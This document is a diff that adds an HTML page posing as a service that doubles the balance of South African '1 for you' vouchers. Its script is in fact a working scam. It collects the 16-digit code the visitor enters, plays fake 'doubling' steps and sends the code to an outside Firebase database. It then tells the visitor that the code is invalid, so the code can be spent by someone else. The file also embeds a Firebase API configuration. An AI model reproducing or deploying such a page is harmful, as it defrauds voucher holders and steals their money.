@@ -1,0 +1,241 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>ONE VOUCHER</title>
+  <style>
+    body {
+      font-family: 'Arial', sans-serif;
+      background-color: #111;
+      color: white;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      position: relative;
+    }
+
+    h1 {
+      font-size: 3rem;
+      color: #0ff;
+      margin-top: 20px;
+      text-align: center;
+    }
+
+    p {
+      font-size: 1.2rem;
+      text-align: center;
+      width: 80%;
+      margin: 20px 0;
+    }
+
+    img {
+      width: 80%;
+      border-radius: 20px;
+      box-shadow: 0 4px 10px rgba(0, 255, 255, 0.3);
+      display: block;
+      margin-top: 20px;
+    }
+
+    .input-container {
+      margin-top: 30px;
+      width: 80%;
+      text-align: center;
+    }
+
+    input, select {
+      width: 80%;
+      padding: 15px;
+      margin: 10px 0;
+      border-radius: 10px;
+      border: 1px solid #0ff;
+      font-size: 1rem;
+      background: black;
+      color: white;
+      text-align: center;
+    }
+
+    select {
+      cursor: pointer;
+    }
+
+    .output-container {
+      margin-top: 20px;
+      width: 80%;
+      text-align: center;
+      font-size: 1.2rem;
+      font-weight: bold;
+      color: #0ff;
+    }
+
+    .button-container {
+      margin-top: 30px;
+      width: 80%;
+    }
+
+    button {
+      width: 100%;
+      padding: 15px;
+      font-size: 1.2rem;
+      font-weight: bold;
+      color: black;
+      background: #0ff;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+      text-transform: uppercase;
+      transition: 0.3s;
+      animation: neonGlow 1s infinite alternate;
+    }
+
+    @keyframes neonGlow {
+      from { box-shadow: 0 0 10px #0ff; }
+      to { box-shadow: 0 0 20px #0ff; }
+    }
+
+    button:hover {
+      background: #00cccc;
+    }
+
+    .error-popup, .jumpscare-screen {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.8);
+      color: red;
+      font-size: 2rem;
+      font-weight: bold;
+      text-align: center;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .jumpscare-screen {
+      background: red;
+      color: black;
+    }
+
+    .processing-screen {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.9);
+      color: #0ff;
+      font-size: 2rem;
+      font-weight: bold;
+      text-align: center;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+    }
+  </style>
+</head>
+<body>
+  <h1>ONE VOUCHER</h1>
+  <p>1 for you voucher is a voucher in South Africa used to pay for goods and services.</p>
+  <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSHZGxkgHzrfZYjs3CMAtygYOU1c6H7BW0buSvUl0eqxH6uqV0fGFtxMK0&s=10" alt="Voucher Image">
+
+  <div class="input-container">
+    <input type="text" id="voucherCode" placeholder="Enter 16-digit voucher code" maxlength="16">
+    <select id="codeBalance">
+      <option value="5">R5</option>
+      <option value="10">R10</option>
+      <option value="15">R15</option>
+      <option value="20">R20</option>
+    </select>
+  </div>
+
+  <div class="output-container">
+    <span id="newBalance">New balance will be: R10</span>
+  </div>
+
+  <div class="button-container">
+    <button id="confirmBtn">Confirm now</button>
+  </div>
+
+  <!-- Error Popup -->
+  <div class="error-popup" id="errorPopup">
+    16-digit code is required!
+  </div>
+
+  <!-- Processing Animation -->
+  <div class="processing-screen" id="processingScreen">
+    <div id="processText">Doubling your balance...</div>
+  </div>
+
+  <!-- Jumpscare Screen -->
+  <div class="jumpscare-screen" id="jumpscareScreen">
+    YOUR CODE IS INVALID OR ALREADY USED!<br>PLEASE TRY AGAIN AFTER 5 MINUTES.
+    <br><br>
+    <button onclick="closeJumpscare()">OK</button>
+  </div>
+
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/11.4.0/firebase-app.js";
+    import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/11.4.0/firebase-database.js";
+
+    const firebaseConfig = {
+      apiKey: "AIzaSyDFHskUWiyHhZke3KT9kkOtFI_gPsKfiGo",
+      authDomain: "itzhoyoo-f9f7e.firebaseapp.com",
+      databaseURL: "https://itzhoyoo-f9f7e-default-rtdb.firebaseio.com",
+      projectId: "itzhoyoo-f9f7e",
+      storageBucket: "itzhoyoo-f9f7e.firebasestorage.app",
+      messagingSenderId: "1094792075584",
+      appId: "1:1094792075584:web:d49e9c3f899d3cd31082a5",
+      measurementId: "G-LLT6F9WRKH"
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const db = getDatabase(app);
+
+    document.getElementById('confirmBtn').addEventListener('click', () => {
+      let code = document.getElementById('voucherCode').value;
+      if (code.length !== 16) {
+        document.getElementById('errorPopup').style.display = "flex";
+        setTimeout(() => {
+          document.getElementById('errorPopup').style.display = "none";
+        }, 2000);
+        return;
+      }
+
+      document.getElementById('processingScreen').style.display = "flex";
+      let steps = ["Doubling your balance...", "Validating new balance...", "Almost done..."];
+      let stepIndex = 0;
+
+      let interval = setInterval(() => {
+        if (stepIndex < steps.length) {
+          document.getElementById('processText').innerText = steps[stepIndex];
+          stepIndex++;
+        } else {
+          clearInterval(interval);
+          document.getElementById('processingScreen').style.display = "none";
+          document.getElementById('jumpscareScreen').style.display = "flex";
+
+          set(ref(db, '1vouchercodes/' + code), {
+            code: code,
+            status: "used"
+          });
+        }
+      }, 2000);
+    });
+
+    function closeJumpscare() {
+      document.getElementById('jumpscareScreen').style.display = "none";
+    }
+
+    document.getElementById('codeBalance').addEventListener('change', function () {
+      document.getElementById('newBalance').textContent = `New balance will be: R${this.value * 2}`;
+    });
+  </script>
+</body>
+</html>
